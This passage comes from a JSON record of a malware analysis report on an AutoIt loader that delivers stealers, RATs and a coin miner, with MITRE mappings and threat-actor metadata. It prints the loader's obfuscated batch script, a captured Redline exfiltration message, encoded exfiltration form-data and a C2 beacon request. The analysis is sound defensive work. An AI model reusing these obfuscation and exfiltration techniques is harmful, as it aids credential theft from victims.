\n  |    cookies_Chrome\n  |    cookies_Chrome.txt\n  |    cookies_Firefox.txt\n  |\n  +---forms\n  |    forms_Chrome\n  |    forms_Chrome.txt\n  |    forms_Firefox.txt\n  |\n  \\---users\n      users_Chrome.txt\n      users_Firefox.txt\n\n#### This sample seems to be different of the Taurus loader that use the same loader but have use three different files for be launch in memory. By the way, the hunting of this loader in the past has shown that different stealers and RAT use this same loader.\n\n## TTPs\n\n#### The global TTPs used by this loader can be resume on this process graphic (some samples have differences like DOS obfuscation) :\n\n## Hunting\n\n#### Firstly, we have observed that this seems to use the same autoit builder for run the autoit script. By their hash we can note two parts\n\n```\n\n-----\n\n#### on the result. The first part is used on malicious MSI file for run autoit script with the builder only as fake installer (early Juny). This doesn't have the same TTPs that this loader. The second part have exactly with the same TTPs and have just some additional obfuscations methods (Early July).\n\n By comparing each case, we can notice that the structure is the same with some differences, and we can see each part of the code.\n\n### DOS script\n\n#### Lot of time, the script isn't obfuscating, the rare cases have a common DOS obfuscation by substrings method on a common base of the alphabet for getting the final code. However, the code rest the same with the kill switch measures, certutil command (with a random one letter name of the script) and launches the autoit payload with the builder.\n```\nSet Fx=0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\n%Fx:~18,1%%Fx:~15,1% %computername% ==\n%Fx:~39,1%%Fx:~40,1%%Fx:~54,1%%Fx:~46,1%%Fx:~55,1%%Fx:~50,1%%Fx:~51,1%\n%Fx:~52,1%%Fx:~50,1%%Fx:~5,1%%Fx:~52,1%%Fx:~56,1%%Fx:~3,1%%Fx:~3,1%\n%Fx:~14,1%%Fx:~33,1%%Fx:~18,1%%Fx:~29,1%\n<%Fx:~23,1%%Fx:~30,1%%Fx:~21,1% %Fx:~28,1%%Fx:~14,1%%Fx:~29,1%\n/%Fx:~25,1% =\"%Fx:~48,1%\" >\n%Fx:~28,1%%Fx:~22,1%%Fx:~28,1%%Fx:~28,1%.%Fx:~12,1%%Fx:~24,1%%Fx:~22,\n%Fx:~29,1%%Fx:~34,1%%Fx:~25,1%%Fx:~14,1%\n%Fx:~35,1%%Fx:~56,1%%Fx:~26,1%%Fx:~28,1%.%Fx:~12,1%%Fx:~24,1%%Fx:~22,\n >>\n%Fx:~28,1%%Fx:~22,1%%Fx:~28,1%%Fx:~28,1%.%Fx:~12,1%%Fx:~24,1%%Fx:~22,\n%Fx:~13,1%%Fx:~14,1%%Fx:~21,1%\n%Fx:~35,1%%Fx:~56,1%%Fx:~26,1%%Fx:~28,1%.%Fx:~12,1%%Fx:~24,1%%Fx:~22,\n%Fx:~12,1%%Fx:~14,1%%Fx:~27,1%%Fx:~29,1%%Fx:~30,1%%Fx:~29,1%%Fx:~18,1%\n -%Fx:~13,1%%Fx:~14,1%%Fx:~12,1%%Fx:~24,1%%Fx:~13,1%%Fx:~14,1%\n%Fx:~47,1%%Fx:~61,1%%Fx:~33,1%%Fx:~44,1%%Fx:~51,1%%Fx:~22,1%%Fx:~20,1%\n %Fx:~48,1%\n%Fx:~28,1%%Fx:~22,1%%Fx:~28,1%%Fx:~28,1%.%Fx:~12,1%%Fx:~24,1%%Fx:~22,\n %Fx:~48,1%\n%Fx:~25,1%%Fx:~18,1%%Fx:~23,1%%Fx:~16,1%\n%Fx:~1,1%%Fx:~2,1%%Fx:~7,1%.%Fx:~0,1%.%Fx:~0,1%.%Fx:~1,1% -%Fx:~23,1%\n%Fx:~3,1%\n\n```\n\n-----\n\n#### This also has just changed the header of the PE builder sometimes in removing a part of the magic numbers or all sometimes for avoid to be triggers in the detection rule that push as condition that be a valid PE (fix it in pushing the missing part \"M\" or \"MZ\").\n\n### Autoit script\n\n#### The obfuscation rest the same with unused functions and While - Switch condition for getting the shellcode to inject, this can decode the binaries (like Taurus) or just execute another shellcode just decoded in memory.\n\n### Data extraction\n\n#### Like said previous many RAT and stealers have been found on this loader.\n\n RAT Redline (XML) :\n\n\n-----\n\n```\n<s:Envelope xmlns:s http://schemas.xmlsoap.org/soap/envelope/ >\n<s:Body><SendClientInfo xmlns=\"http://tempuri.org/\"><user\nxmlns:a=\"v1/Models\" xmlns:i=\"http://www.w3.org/2001/XMLSchemainstance\">\n<a:BuildID>01 08</a:BuildID>\n<a:Country>NL</a:Country>\n<a:Credentials>\n<a:Browsers>\n<a:Browser>\n<a:Autofills/>\n<a:Cookies>\n<a:Expires>1564575439</a:Expires>\n<a:Host>.mozilla.org</a:Host>\n<a:Http>true</a:Http>\n<a:Name>_gid</a:Name>\n<a:Path>/</a:Path>\n<a:Secure>false</a:Secure>\n<a:Value>GA1.2.913472244.1564489040</a:Value></a:Cookie>\n<a:Hardware>\n<a:Caption>Intel(R) Core(TM) ix CPU @ xGHz</a:Caption>\n<a:HardType>Processor</a:HardType>\n<a:Parameter>2</a:Parameter></a:Hardware>\n<a:Hardware>\n<a:Caption>Total of RAM</a:Caption>\n<a:HardType>Graphic</a:HardType>\n<a:Parameter>3583.61 MB or 3757686784</a:Parameter></a:Hardware>\n</a:Hardwares>\n<a:InstalledBrowsers>\n<a:InstalledBrowserInfo>\n<a:Name>Mozilla Firefox</a:Name>\n<a:Path>C:\\Program Files\\Mozilla Firefox\\firefox.exe</a:Path>\n<a:Version>68.0.1</a:Version></a:InstalledBrowserInfo>\n<a:InstalledBrowserInfo>\n<a:Name>Google Chrome</a:Name>\n<a:Path>C:\\Program\nFiles\\Google\\Chrome\\Application\\chrome.exe</a:Path>\n<a:Version>75.0.3770.100</a:Version></a:InstalledBrowserInfo>\n<a:InstalledBrowserInfo>\n<a:Name>Internet Explorer</a:Name>\n<a:Path>C:\\Program Files\\Internet Explorer\\iexplore.exe</a:Path>\n<a:Version>11.00.9600.16428 (winblue_gdr.131013-1700)</a:Version>\n</a:InstalledBrowserInfo>\n<a:InstalledBrowserInfo>\n<a:Name>Opera</a:Name>\n<a:Path>C:\\Program Files\\Opera\\Opera.exe</a:Path>\n<a:Version>1748</a:Version></a:InstalledBrowserInfo>\n</a:InstalledBrowsers>\n<a:InstalledSoftwares\nxmlns:b=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\">\n     <b:string>Adobe Acrobat Reader DC MUI [15.023.20070]\n</b:string>\n     <b:string>Adobe Flash Player 26 ActiveX [26.0.0.131]\n</b:string>\n  [...]\n     <b:string>VLC media player [2.2.6]</b:string>\n\n```\n\n-----\n\n```\n     <b:string>WinRAR 5.60 (32 bit) [5.60.0]</b:string>\n</a:InstalledSoftwares>\n<a:Languages\nxmlns:b=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\">\n     <b:string>English (United States)</b:string></a:Languages>\n<a:Processes\nxmlns:b=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\">\n     <b:string>ID: 392, Name: csrss.exe, CommandLine: </b:string>\n  [...]\n     <b:string>ID: 1804, Name: RegAsm.exe, CommandLine:\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe </b:string>\n</a:Processes></a:Credentials>\n<a:CurrentLanguage>English (United States)</a:CurrentLanguage>\n<a:Exceptions\nxmlns:b=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\"/>\n<a:FingerPrint>\n<a:Plugins>UNKNOWN</a:Plugins>\n<a:UserAgent>UNKNOWN</a:UserAgent>\n<a:WebBaseGlRenderer>UNKNOWN</a:WebBaseGlRenderer>\n<a:WebBaseGlVendor>UNKNOWN</a:WebBaseGlVendor>\n<a:WebBaseGlVersion>UNKNOWN</a:WebBaseGlVersion>\n<a:WebDebugGlRenderer>UNKNOWN</a:WebDebugGlRenderer>\n<a:WebDebugGlVendor>UNKNOWN</a:WebDebugGlVendor></a:FingerPrint>\n<a:HWID>7CAAB55F3C2D7D2AA0AD7BDE756AC65A</a:HWID>\n<a:IP>IP Victim</a:IP>\n<a:IsProcessElevated>false</a:IsProcessElevated>\n<a:Location>Location Victim</a:Location>\n<a:LogDate>0001-01-01T00:00:00</a:LogDate>\n<a:MonitorSize>1280x720</a:MonitorSize>\n<a:OS>Windows 7 Professional x32</a:OS>\n<a:PostalCode>UNKNOWN</a:PostalCode>\n<a:Screenshot>iVBORw0KGgoAAAANSUhEUg ...\n<a:TimeZone>UTC+01:00:00</a:TimeZone>\n<a:Username>admin</a:Username></user></SendClientInfo></s:Body>\n</s:Envelope>\n\n#### Variant Autoit Injector (Base 64 + custom algorithm)\n\n```\n\n-----\n\n```\n           3YI8f9ylk827O44x\nContent-Disposition: form-data; name=\"BRElVD1NTQ==\"\nIQomRj5dSxwxBj89HANdNw==\n------------------3YI8f9ylk827O44x\nContent-Disposition: form-data; name=\"BRElVCNZVAo=\"\nLxcuWCMYfQ4ZJA==\n------------------3YI8f9ylk827O44x\nContent-Disposition: form-data; name=\"ExsgVQ==\"\nB0x+V3xZDlpYJ2YpF1gJW35yPDUAR11SB1IHTHoGKA5cV1sjM39AV1kOfCZrYlVCXVQHDw\n------------------3YI8f9ylk827O44x\nContent-Disposition: form-data; name=\"ExsgXytX\"\nQwRpOwRWTQoBbQVmUy1XGS1rDRwaVANSGQBXSHkRDmhsTy1lZWFEXn8jMmMlcQd+SlwUA\n------------------3YI8f9ylk827O44x\nContent-Disposition: form-data; name=\"ABc8Xzk=\"\nUg==\n------------------3YI8f9ylk827O44x\nContent-Disposition: form-data; name=\"Bw5wRQxe\";\nfilename=\"LxcuWCMYfQ4ZJA==\"\nContent-Type: application/octet-stream\n\n#### CoinMiner 1ms0rry Botnet (HTTP)\nHTTP/1.1 200 OK\nServer: nginx/1.16.1\nDate: xxx\nContent-Type: text/html; charset=UTF-8\nContent-Length: 1\nConnection: keep-alive\nSet-Cookie: PHPSESSID=da19fc7e571fde73afc839a4b684260f; path=/\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nCache-Control: no-store, no-cache, must-revalidate, post-check=0,\npre-check=0\nPragma: no-cache\n1\nGET /cmd.php?hwid=C4BA3647 HTTP/1.1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0)\nGecko/20100101 Firefox/53.0\nHost: cq17178.tmweb.ru\n\n Rest a lot of stealer and RAT used, the domain and IP are quickly used in the time for a mass campaign.\n\n https://urlhaus.abuse.ch/url/407605/\n\n We can note like the initial sample that usurp Malwarebytes solution, this usurps others security solutions or windows programs (here,\n\n```\n\n-----\n\n#### Internet Explorer). Malwarebytes solution, this usurps others security solutions or windows programs (here, Internet Explorer).\n\n Fake 7SFX Internet Explorer\n\n This which will be more like a Loader as the service (LAAS) solution or the same Threat Actor that use it for a mass campaign for resell accounts and leaks on the markets.These targets the individuals and companies with fake software and maldocs.\n\n All the TTPs match can be consult here.\n\n The coder of the loader have use quite a few posts posted via russian forums in designing the configuration and script of the SFX archive.\n\n\n-----\n\n## Cyber kill chain\n\n#### This process graph represent the cyber kill chain used by the attacker.\n\n## Indicators Of Compromise (IOC)\n\n#### The IOC can be exported in JSON and CSV\n\n## References MITRE ATT&CK Matrix\n\n#### Enterprise tactics Technics used Ref URL\n\n\n-----\n\n#### Enterprise tactics Technics used Ref URL\n\n\n#### Execution Command-Line Interface\n Execution through API\n Execution through Module Load\n\n Persistence Registry Run Keys / Startup Folder\n\n\n#### Defense Evasion\n\n Credential Access\n\n\n#### Deobfuscate/Decode Files or Information\n\n Credential Dumping\n Credentials in Files\n\n\n#### https://attack.mitre.org/techniques/T1059\n https://attack.mitre.org/techniques/T1106\n https://attack.mitre.org/techniques/T1129\n\n https://attack.mitre.org/techniques/T1060\n\n https://attack.mitre.org/techniques/T1140\n\n https://attack.mitre.org/techniques/T1003\n https://attack.mitre.org/techniques/T1081\n\n https://attack.mitre.org/techniques/T1012\n https://attack.mitre.org/techniques/T1082\n\n\n#### Discovery Query Registry\n System Information Discovery\n\n\n#### This can be exported as JSON format Export in JSON\n\n## Links\n\n#### Original tweet:\n\n https://twitter.com/Artilllerie/status/1299249738764689413 https://twitter.com/JAMESWT_MHT/status/1301536610606100481\n\n Anyrun Links :\n\n References:\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-09-07 - Time to take the bull by the horns.pdf"
    ],
    "report_names": [
        "2020-09-07 - Time to take the bull by the horns.pdf"
    ],
    "threat_actors": [
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673536257,
    "ts_updated_at": 1743041140,
    "ts_creation_date": 1653767867,
    "ts_modification_date": 1653767867,
    "files": {
        "pdf": "https://archive.orkl.eu/2d15d36c4486ba9cef673ea27bc33748f2d1451a.pdf",
        "text": "https://archive.orkl.eu/2d15d36c4486ba9cef673ea27bc33748f2d1451a.txt",
        "img": "https://archive.orkl.eu/2d15d36c4486ba9cef673ea27bc33748f2d1451a.jpg"
    }
}